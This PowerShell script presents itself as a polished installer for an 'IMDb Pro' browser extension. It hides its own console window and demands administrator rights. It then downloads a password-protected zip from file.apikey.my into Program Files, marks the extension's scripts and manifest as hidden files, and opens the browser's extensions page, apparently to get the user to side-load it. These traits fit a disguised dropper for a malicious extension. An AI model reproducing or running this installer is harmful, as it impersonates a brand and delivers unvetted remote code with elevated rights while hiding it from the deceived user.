Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Hide PowerShell console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Helper: Create rounded GraphicsPath
function Get-RoundedPath {
    param(
        [int]$x, [int]$y, [int]$w, [int]$h, [int]$r
    )
    $gp = New-Object System.Drawing.Drawing2D.GraphicsPath
    $diam = $r * 2
    $gp.AddArc($x, $y, $diam, $diam, 180, 90)
    $gp.AddArc($x + $w - $diam, $y, $diam, $diam, 270, 90)
    $gp.AddArc($x + $w - $diam, $y + $h - $diam, $diam, $diam, 0, 90)
    $gp.AddArc($x, $y + $h - $diam, $diam, $diam, 90, 90)
    $gp.CloseFigure()
    return $gp
}

# Helper: Create a rounded button with hover effects
function New-RoundedButton {
    param(
        [string]$Text,
        [int]$X,
        [int]$Y,
        [int]$Width,
        [int]$Height,
        [System.Drawing.Color]$BackColor,
        [System.Drawing.Color]$HoverColor,
        [System.Drawing.Color]$ForeColor
    )

    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = $Text
    $btn.Size = New-Object System.Drawing.Size($Width, $Height)
    $btn.Location = New-Object System.Drawing.Point($X, $Y)
    $btn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $btn.FlatAppearance.BorderSize = 0
    $btn.BackColor = $BackColor
    $btn.Tag = @{ Normal = $BackColor; Hover = $HoverColor }
    $btn.ForeColor = $ForeColor
    $btn.Cursor = [System.Windows.Forms.Cursors]::Hand
    $btn.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)

    $btn.Add_Paint({
        $r = 8
        $path = Get-RoundedPath 0 0 $this.Width $this.Height $r
        $this.Region = New-Object System.Drawing.Region $path
        $g = $args[1].Graphics
        $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
        $brush = New-Object System.Drawing.SolidBrush $this.BackColor
        $g.FillPath($brush, $path)
        $brush.Dispose()
        $pen = New-Object System.Drawing.Pen ([System.Drawing.Color]::FromArgb(40,40,40))
        $g.DrawPath($pen, $path)
        $pen.Dispose()
    })

    $btn.Add_MouseEnter({
        $this.BackColor = $this.Tag.Hover
        $this.Invalidate()
    })
    $btn.Add_MouseLeave({
        $this.BackColor = $this.Tag.Normal
        $this.Invalidate()
    })

    return $btn
}

# Create main form - Modern professional style
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "Install IMDb Pro"
$mainForm.Size = New-Object System.Drawing.Size(640, 380)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(245,245,247)
$mainForm.ForeColor = [System.Drawing.Color]::FromArgb(32,32,32)
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$mainForm.MaximizeBox = $false
$mainForm.MinimizeBox = $true

# Subtle shadow panel (background layer)
$shadow = New-Object System.Windows.Forms.Panel
$shadow.Size = New-Object System.Drawing.Size(620, 300)
$shadow.Location = New-Object System.Drawing.Point(10, 40)
$shadow.BackColor = [System.Drawing.Color]::FromArgb(230,230,235)
$mainForm.Controls.Add($shadow)

# Header with gradient-like effect using two panels
$header = New-Object System.Windows.Forms.Panel
$header.Size = New-Object System.Drawing.Size(620, 80)
$header.Location = New-Object System.Drawing.Point(10, 10)
$header.BackColor = [System.Drawing.Color]::FromArgb(15, 25, 40)
$mainForm.Controls.Add($header)

# App icon (emoji) - large
$iconLabel = New-Object System.Windows.Forms.Label
$iconLabel.Text = "🎬"
$iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 28)
$iconLabel.AutoSize = $true
$iconLabel.Location = New-Object System.Drawing.Point(20, 18)
$header.Controls.Add($iconLabel)

# Title and subtitle
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "IMDb Pro — Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(255,255,255)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(78, 18)
$header.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional browser extension • v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(200,200,210)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(78, 42)
$header.Controls.Add($subtitleLabel)

# Info panel (content)
$content = New-Object System.Windows.Forms.Panel
$content.Size = New-Object System.Drawing.Size(600, 220)
$content.Location = New-Object System.Drawing.Point(20, 100)
$content.BackColor = [System.Drawing.Color]::FromArgb(255,255,255)
$content.BorderStyle = [System.Windows.Forms.BorderStyle]::None
$mainForm.Controls.Add($content)

# App information labels
$appLabel = New-Object System.Windows.Forms.Label
$appLabel.Text = "Browser Extension"
$appLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$appLabel.ForeColor = [System.Drawing.Color]::FromArgb(28,28,28)
$appLabel.AutoSize = $true
$appLabel.Location = New-Object System.Drawing.Point(18, 12)
$content.Controls.Add($appLabel)

$pubLabel = New-Object System.Windows.Forms.Label
$pubLabel.Text = "Publisher: IMDb Pro Team"
$pubLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$pubLabel.ForeColor = [System.Drawing.Color]::FromArgb(110,110,120)
$pubLabel.AutoSize = $true
$pubLabel.Location = New-Object System.Drawing.Point(18, 42)
$content.Controls.Add($pubLabel)

$verLabel = New-Object System.Windows.Forms.Label
$verLabel.Text = "Version: 2.1.0"
$verLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$verLabel.ForeColor = [System.Drawing.Color]::FromArgb(110,110,120)
$verLabel.AutoSize = $true
$verLabel.Location = New-Object System.Drawing.Point(18, 62)
$content.Controls.Add($verLabel)

# Changelog link
$changelog = New-Object System.Windows.Forms.LinkLabel
$changelog.Text = "View changelog"
$changelog.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
$changelog.LinkColor = [System.Drawing.Color]::FromArgb(0,120,215)
$changelog.AutoSize = $true
$changelog.Location = New-Object System.Drawing.Point(18, 88)
$changelog.Add_LinkClicked({
    try {
        Start-Process "https://example.com/changelog"
    } catch {}
})
$content.Controls.Add($changelog)

# Agreement and options (styled card)
$card = New-Object System.Windows.Forms.Panel
$card.Size = New-Object System.Drawing.Size(540, 90)
$card.Location = New-Object System.Drawing.Point(18, 110)
$card.BackColor = [System.Drawing.Color]::FromArgb(250,250,252)
$card.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$content.Controls.Add($card)

$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
$agreementCheckbox.Text = "I agree to the terms and conditions"
$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$agreementCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(40,40,40)
$agreementCheckbox.AutoSize = $true
$agreementCheckbox.Location = New-Object System.Drawing.Point(12, 12)
$agreementCheckbox.Checked = $false
$card.Controls.Add($agreementCheckbox)

$launchCheckbox = New-Object System.Windows.Forms.CheckBox
$launchCheckbox.Text = "Open extensions page after install"
$launchCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$launchCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
$launchCheckbox.AutoSize = $true
$launchCheckbox.Location = New-Object System.Drawing.Point(12, 38)
$launchCheckbox.Checked = $true
$card.Controls.Add($launchCheckbox)

$installCheckbox = New-Object System.Windows.Forms.CheckBox
$installCheckbox.Text = "Install to default location"
$installCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$installCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
$installCheckbox.AutoSize = $true
$installCheckbox.Location = New-Object System.Drawing.Point(12, 60)
$installCheckbox.Checked = $true
$card.Controls.Add($installCheckbox)

# Progress area (initially hidden)
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(18, 330)
$progressBar.Size = New-Object System.Drawing.Size(440, 18)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0,120,215)
$progressBar.Value = 0
$progressBar.Visible = $false
$mainForm.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(90,90,90)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(468, 328)
$percentLabel.Visible = $false
$mainForm.Controls.Add($percentLabel)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = ""
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(100,100,100)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(18, 308)
$statusLabel.Visible = $false
$mainForm.Controls.Add($statusLabel)

# ToolTip
$toolTip = New-Object System.Windows.Forms.ToolTip
$toolTip.SetToolTip($agreementCheckbox, "You must agree to continue")
$toolTip.SetToolTip($launchCheckbox, "Open Chrome or Edge extensions page after install")
$toolTip.SetToolTip($installCheckbox, "Install into C:\Program Files\imdb-pro (default)")

# Buttons: Cancel, Install (rounded)
$cancelBtn = New-RoundedButton "Cancel" 420 18 90 36 `
    ([System.Drawing.Color]::FromArgb(245,245,247)) `
    ([System.Drawing.Color]::FromArgb(232,232,234)) `
    ([System.Drawing.Color]::FromArgb(60,60,60))
$cancelBtn.Font = New-Object System.Drawing.Font("Segoe UI",9)
$mainForm.Controls.Add($cancelBtn)

$installBtn = New-RoundedButton "Install" 520 18 90 36 `
    ([System.Drawing.Color]::FromArgb(0,120,215)) `
    ([System.Drawing.Color]::FromArgb(0,100,190)) `
    ([System.Drawing.Color]::White)
$installBtn.Enabled = $false
$mainForm.Controls.Add($installBtn)

# Small spinner using a Label updated by Timer
$spinner = New-Object System.Windows.Forms.Label
$spinner.Text = ""
$spinner.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
$spinner.AutoSize = $true
$spinner.Location = New-Object System.Drawing.Point(520, 324)
$spinner.Visible = $false
$mainForm.Controls.Add($spinner)

$spinTimer = New-Object System.Windows.Forms.Timer
$spinTimer.Interval = 120
$spinSequence = @("⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠏")
$spinIndex = 0
$spinTimer.Add_Tick({
    $spinner.Text = $spinSequence[$spinIndex % $spinSequence.Length]
    $spinIndex++
})

# Enable install when agreement is checked
$agreementCheckbox.Add_CheckedChanged({
    if ($agreementCheckbox.Checked) {
        $installBtn.Enabled = $true
        $installBtn.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
        $installBtn.Tag.Normal = [System.Drawing.Color]::FromArgb(0,120,215)
    } else {
        $installBtn.Enabled = $false
        $installBtn.BackColor = [System.Drawing.Color]::FromArgb(200,200,204)
        $installBtn.Tag.Normal = [System.Drawing.Color]::FromArgb(200,200,204)
    }
})

# Progress update helper
function Update-ProgressView {
    param([string]$Message, [int]$Percent)
    $statusLabel.Visible = $true
    $statusLabel.Text = $Message
    $progressBar.Visible = $true
    $percentLabel.Visible = $true
    $percentLabel.Text = "$Percent`%"
    if ($Percent -ge 0 -and $Percent -le 100) {
        $progressBar.Value = $Percent
    }
    [System.Windows.Forms.Application]::DoEvents()
}

# Show completion view
function Show-Completion {
    $spinTimer.Stop()
    $spinner.Visible = $false
    $statusLabel.Text = "Installation completed successfully!"
    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0,120,60)
    $percentLabel.Text = "100%"
    $installBtn.Text = "Done"
    $installBtn.Enabled = $false
    # Add close button
    $closeBtn = New-RoundedButton "Close" 520 18 90 36 `
        ([System.Drawing.Color]::FromArgb(0,120,215)) `
        ([System.Drawing.Color]::FromArgb(0,100,190)) `
        ([System.Drawing.Color]::White)
    $closeBtn.Add_Click({
        if ($launchCheckbox.Checked) {
            try { Start-Process "chrome.exe" "chrome://extensions" } catch { try { Start-Process "msedge.exe" "edge://extensions" } catch {} }
        }
        $mainForm.Close()
    })
    $mainForm.Controls.Add($closeBtn)
}

# Installation logic (same flow but with UI polish)
function Start-Installation {
    # UI setup for install
    $installBtn.Enabled = $false
    $cancelBtn.Enabled = $false
    $spinner.Visible = $true
    $spinIndex = 0
    $spinTimer.Start()
    Update-ProgressView "Preparing installation..." 5

    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"

    try {
        # Check admin rights
        Update-ProgressView "Checking administrator privileges..." 8
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            throw "Please run this installer as Administrator"
        }

        # Create directory
        Update-ProgressView "Preparing files..." 15
        if (Test-Path $installPath) {
            Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
        } else {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }

        # Download
        Update-ProgressView "Downloading package..." 30
        $tempFile = "$env:TEMP\imdb.zip"
        $webClient = New-Object System.Net.WebClient
        $downloadSucceeded = $false
        try {
            $webClient.DownloadFile($downloadUrl, $tempFile)
            if (Test-Path $tempFile -and (Get-Item $tempFile).Length -gt 0) { $downloadSucceeded = $true }
        } catch {
            $downloadSucceeded = $false
        }
        if (-not $downloadSucceeded) { throw "Download failed. Check internet or URL." }

        Update-ProgressView "Extracting files..." 55

        # Try 7-zip, fallback to Expand-Archive
        $seven = "$env:ProgramFiles\7-Zip\7z.exe"
        if (Test-Path $seven) {
            $args = @("x","-p$zipPassword","-o`"$installPath`"","-y","`"$tempFile`"")
            $proc = Start-Process -FilePath $seven -ArgumentList $args -Wait -PassThru -NoNewWindow
            if ($proc.ExitCode -ne 0) { throw "7-Zip extraction failed" }
        } else {
            try {
                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
            } catch {
                throw "Extraction failed: no 7-Zip and Expand-Archive failed"
            }
        }

        # Verify
        Update-ProgressView "Verifying installation..." 75
        $items = Get-ChildItem $installPath -Recurse -ErrorAction SilentlyContinue
        if ($items.Count -eq 0) { throw "No files extracted" }

        # Hide sensitive files if present
        $hidden = @("background.js","content.js","popup.js","styles.css","popup.html","manifest.json")
        foreach ($f in $hidden) {
            $p = Join-Path $installPath $f
            if (Test-Path $p) {
                attrib +h $p
            }
        }

        # Cleanup
        if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }

        Update-ProgressView "Finishing up..." 90
        Start-Sleep -Milliseconds 600
        Update-ProgressView "Complete" 100
        Start-Sleep -Milliseconds 400

        Show-Completion
    }
    catch {
        $spinTimer.Stop()
        $spinner.Visible = $false
        $statusLabel.Visible = $true
        $statusLabel.Text = "Installation failed: $($_.Exception.Message)"
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(200,40,40)
        $progressBar.Visible = $false
        $percentLabel.Visible = $false

        # Show Retry button
        $retryBtn = New-RoundedButton "Retry" 520 18 90 36 `
            ([System.Drawing.Color]::FromArgb(0,120,215)) `
            ([System.Drawing.Color]::FromArgb(0,100,190)) `
            ([System.Drawing.Color]::White)
        $retryBtn.Add_Click({
            $mainForm.Controls.Remove($retryBtn)
            $statusLabel.Text = ""
            $progressBar.Value = 0
            $percentLabel.Text = "0%"
            Start-Installation
        })
        $mainForm.Controls.Add($retryBtn)
        $cancelBtn.Enabled = $true
    }
    finally {
        # re-enable cancel if not completed
        if ($installBtn.Enabled -eq $false) {
            # keep install disabled until completion
        } else {
            $cancelBtn.Enabled = $true
        }
    }
}

# Wire button events
$cancelBtn.Add_Click({
    try { $mainForm.Close() } catch {}
})

$installBtn.Add_Click({
    if ($agreementCheckbox.Checked) {
        Start-Installation
    }
})

# Keyboard accessibility: Enter to install, Esc to cancel
$mainForm.Add_KeyDown({
    param($s,$e)
    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter -and $installBtn.Enabled) { $installBtn.PerformClick() }
    if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) { $cancelBtn.PerformClick() }
})
$mainForm.KeyPreview = $true

[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
